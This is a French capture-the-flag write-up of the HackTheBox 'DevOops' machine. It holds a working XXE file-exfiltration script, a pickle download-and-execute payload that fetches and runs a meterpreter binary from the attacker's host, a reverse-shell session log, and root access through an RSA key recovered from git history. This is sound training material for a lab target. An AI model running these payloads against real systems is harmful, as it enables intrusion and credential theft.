# Solution du CTF DevOops de HackTheBox

Mon petit poney
---------------

Un scan TCP de la machine retourne deux ports ouverts. Le premier est un SSH sur le port habituel, le second est un serveur web sur le port 5000.  

Ce serveur indique la bannière *gunicorn/19.7.1*. Il s'agit d'un serveur web en Python.  

Une recherche rapide de vulnérabilités pour ce logiciel ne retourne rien d'intéressant.  

J'ai passé un peu de temps sur le serveur SSH dont la version (*SSH-2.0-OpenSSH\_7.2p2 Ubuntu-4ubuntu2.4*) semble vulnérable à une faille d'énumération des comptes utilisateurs.  

On trouve [un exploit en Python sur exploit-db](https://www.exploit-db.com/exploits/40113/) qui fait appel à la librairie Paramiko. Les résultats ne sont clairement pas à la hauteur.  

*Metasploit* dispose d'un module pour cette énumération qui semble bien plus fiable (on retrouve les même utilisateurs découverts d'un lancement à l'autre).  

Le lancement d'*Hydra* pour trouver les mots de passe des comptes SSH n'a malheureusement aboutit nul part... mauvaise piste.  

Du coup il est temps de pointer notre browser sur ce fameux port 5000 et on est accueillit par le message suivant :  

> Under construction!  
> 
>   
> 
> This is feed.py, which will become the MVP for Blogfeeder application.  
> 
>   
> 
> TODO: replace this with the proper feed from the dev.solita.fi backend.

Cette page dispose d'une image correspondant au path */feed*.  

Si on tente de poster des données à cette adresse (un simple *curl -X POST* suffira) ou sur l'index on se retrouve avec une belle erreur 405 (méthode non permise) du coup on lance un Gobuster pour trouver d'autres urls :  

```bash
gobuster -u http://10.10.10.91:5000 -w /usr/share/golismero/wordlist/fuzzdb/Discovery/PredictableRes/raft-small-directories.txt
```

Il y a une particularité à prendre en compte lors de cette énumération c'est que l'on est sur un serveur web applicatif avec un système de routage comme sous *Flask* ce qui fait que */feed* retourne un statut 200 alors que */feed/* (avec un slash terminal) retourne un statut 404.  

Un serveur web classique (comme *Apache*) aura tendance à rediriger vers la version avec le slash terminal donc il est sans doute préférable de faire un scan sans spécifier le slash et pour celà il faut bien lire la documentation du dirbuster utilisé (dirb ajoute par défaut le slash par exemple).  

Gobuster trouve quasi instantanément une page à */upload* qui nous invite visiblement à soumettre un fichier XML. Ça sent la faille XXE à plein nez.  

![DevOops HackTheBox CTF XXE vulnerable form](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/devoops_upload.png)

Ni une ni deux on met un port 80 en écoute et on envoie un fichier XML pour voir si le script va aller chercher la DTD (fichier servant à la validation de notre XML).  

Le XML est l'exemple type :  

```html
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://my_ip/test.txt">
]>
<r>&sp;</r>
```

L'envoi peut se faire via cURL :  

```plain
$ curl -D- -X POST http://10.10.10.91:5000/upload --form "file=@test.xml"
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Type: text/html
Content-Length: 141

<html>
  <head>
    <title>Internal Server Error</title>
  </head>
  <body>
    <h1><p>Internal Server Error</p></h1>

  </body>
</html>
```

Malgré l'erreur 500 ça toque bien à la porte :)   

```plain
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.91 - - [06/Sep/2018 14:23:09] code 404, message File not found
10.10.10.91 - - [06/Sep/2018 14:23:09] "GET /test.txt HTTP/1.0" 404 -
```

Lint or die trying
------------------

La suite logique est de passer à un [payload XXE](https://gist.github.com/staaldraad/01415b990939494879b4) permettant l'exfiltration des fichiers. Seulement, si à chaque fois notre DTD est chargée, ça ne va pas plus loin.  

Il va donc falloir faire en sorte que le XML que l'on envoie soit accepté par le serveur et pour cela il faut vraisemblablement placer les entités mentionnées (*Author*, *Subject* et *Content*).  

On se rend assez vite compte que si on envoie du XML dégueulasse l'erreur 500 nous attend au tournant. Je n'entrerais pas dans les détails mais globalement je me suis servi de l’utilitaire [xmllint](http://xmlsoft.org/xmllint.html) avec son option *--valid*.  

Quand on parvient finalement à générer un XML valide on remarque qu'en plus du message de réussite de l'upload on a un nom d’utilisateur Unix mentionné :  

```plain
URL for later reference: /uploads/foo.xml
File path: /home/roosa/deploy/src
```

Au final j'ai écrit le code d'exploitation suivant permettant de récupérer le contenu d'un fichier :  

```python
import sys

import requests
from requests.exceptions import RequestException
from netifaces import ifaddresses

if len(sys.argv) < 2:
    print("Usage: python {} filename".format(sys.argv[0]))
    exit()

my_ip = ifaddresses("tun0")[2][0]["addr"]
filename = sys.argv[1]

xml = """<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root SYSTEM "http://{}/valid.dtd">
<root>
<Author>&xxe;</Author>
<Subject></Subject>
<Content></Content>
</root>""".format(my_ip)

dtd = """<?xml version="1.0" encoding="UTF-8" ?>
<!ELEMENT root (Author, Subject, Content)>
<!ENTITY xxe SYSTEM "file://{}" >
<!ELEMENT Author (#PCDATA)>
<!ELEMENT Subject (#PCDATA)>
<!ELEMENT Content (#PCDATA)>""".format(filename)

with open("valid.dtd", "w") as fd:
    fd.write(dtd)

try:
    response = requests.post(
        "http://10.10.10.91:5000/upload",
        files=[
            ("file", ("foo.xml", xml, "application/xml"))
        ]
    )
except RequestException as exception:
    print("Error occurred:", exception)
else:
    text = response.text.split("Author: ", 1)[1].rsplit("Subject:", 1)[0].strip()
    print(text)
```

La difficulté d'exploitation des failles XXE réside dans le fait qu'il faille gérer à la fois l'envoi du XML, le contenu de la DTD qui contient le nom du fichier à exfiltrer et le serveur web en écoute pour les dumps.  

Ici le code se charge des deux premiers problèmes, pour le reste on peut laisser un *http.server* tourner en background.  

```plain
$ python3 get_file.py /home/roosa/user.txt
c5808e1643e801d40f09ed87cdecc67b
```

Il est aussi possible de récupérer la clé *id\_rsa* de l'utilisateur malheureusement elle n'est pas utilisable (le serveur demande un mot de passe) peut-être (?) en raisons de permissions trop laxistes sur le fichier.  

Step Into The Realm
-------------------

On a la chance de disposer du chemin pour le script *feed.py* (*/home/roosa/deploy/src*) donc ce dernier est facilement récupérable :)  

```python
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']

## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)
```

On remarque tout de suite la présence d'une dé-sérialisation via Pickle [bien connue pour être exploitable](https://web.archive.org/web/20141130012429/http://nadiaspot.com/why-python-pickle-is-insecure/).  

C'est bien le 3ème CTF où je tombe sur du pickle, comme quoi si tu n'as pas exploité du pickle à 30 ans t'as raté ta vie :D  

Inutile de faire dans l'originalité, j'écrit d'abord un script de type download-execute :  

```python
import os
import urllib
import sys
import time
urllib.urlretrieve("http://10.10.15.207/devloop_meterpreter", "/var/tmp/devloop_meterpreter")
os.system("chmod 777 /var/tmp/devloop_meterpreter;/var/tmp/devloop_meterpreter &")
time.sleep(10)
```

Et on passe ça à [evilPick](https://github.com/francescolacerenza/evilPick) qui peut en plus nous l'encoder en base64 :)  

Pour l'envoi du payload, au choix avec cURL / requests / whatever...  

```plain
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.

[*] Started reverse TCP handler on 10.10.15.207:443
msf exploit(multi/handler) > [*] Sending stage (861480 bytes) to 10.10.10.91
[*] Meterpreter session 1 opened (10.10.15.207:443 -> 10.10.10.91:41722) at 2018-09-04 12:16:24 +0200

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: uid=1002, gid=1002, euid=1002, egid=1002

msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.91 - Collecting local exploits for x86/linux...
[*] 10.10.10.91 - 23 exploit checks are being tried...
[+] 10.10.10.91 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The target service is running, but could not be validated.
[+] 10.10.10.91 - exploit/linux/local/pkexec: The target service is running, but could not be validated.
[*] Post module execution completed
```

Cette fois on a notre shell avec l’utilisateur *roosa* :)   

Commit leak
-----------

Via un listing récursif je note tout ce qui peut être d'intérêt dans le dossier personnel :  

```plain
./.config/libaccounts-glib:
total 20
drwxr-xr-x  2 roosa roosa  4096 Mar 21 07:09 .
drwx------ 14 roosa roosa  4096 Mar 21 07:10 ..
-rw-r--r--  1 roosa roosa 12288 Mar 21 07:09 accounts.db

./.local/share/keyrings:
total 16
drwx------  2 roosa roosa 4096 May 29 10:32 .
drwx------ 11 roosa roosa 4096 Mar 21 07:09 ..
-rw-------  1 roosa roosa  105 Mar 26 06:37 login.keyring
-rw-------  1 roosa roosa  207 Mar 21 07:09 user.keystore

./deploy/resources/integration:
total 12
drwxrwx--- 2 roosa roosa 4096 Mar 26 07:50 .
drwxrwx--- 3 roosa roosa 4096 Mar 26 07:50 ..
-rw------- 1 roosa roosa 1679 Mar 26 07:50 authcredentials.key

./work/blogfeed/resources/integration:
total 12
drwxrwx--- 2 roosa roosa 4096 Mar 19 09:31 .
drwxrwx--- 3 roosa roosa 4096 Mar 19 09:31 ..
-rw------- 1 roosa roosa 1679 Mar 19 09:32 authcredentials.key
```

Les fichiers *authcredentials.key* sont des clés privées RSA mais aucune ne nous permet l'accès en root à SSH :'(  

On voit tout de même que le dossier *blogfeed* est versionné par Git donc je récupère le dépôt en local et comme je suis une grosse feignasse qui n'aime pas taper des commandes Git je charge ça dans *PyCharm* et je vais voir les logs :  

![DevOops HackTheBox CTF Git logs](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/devoops_git_log.png)

Et on peut voir la présence d'une ancienne clé privée RSA via diff :  

![DevOops HackTheBox CTF Git commit rsa key](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/devoops_auth_key_diff.png)

Cette fois c'est la bonne :  

```plain
devloop@kali:~/Documents/devoops$ ssh -i old_rsa.key root@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Tue Sep  4 06:25:21 2018 from 10.10.15.168
root@gitter:~# id
uid=0(root) gid=0(root) groups=0(root)
root@gitter:~# cat root.txt
d4fe1e7f7187407eebdd3209cb1ac7b3
```

Happy ending
------------

Un challenge sympa qui a permis d'exploiter une faille XXE dans du code Python et nécessitait un XML dans un format spécifique. Fouiller dans Git n'était pas bien compliqué mais rajoutait un peu d'originalité.

*Published October 14 2018 at 08:47*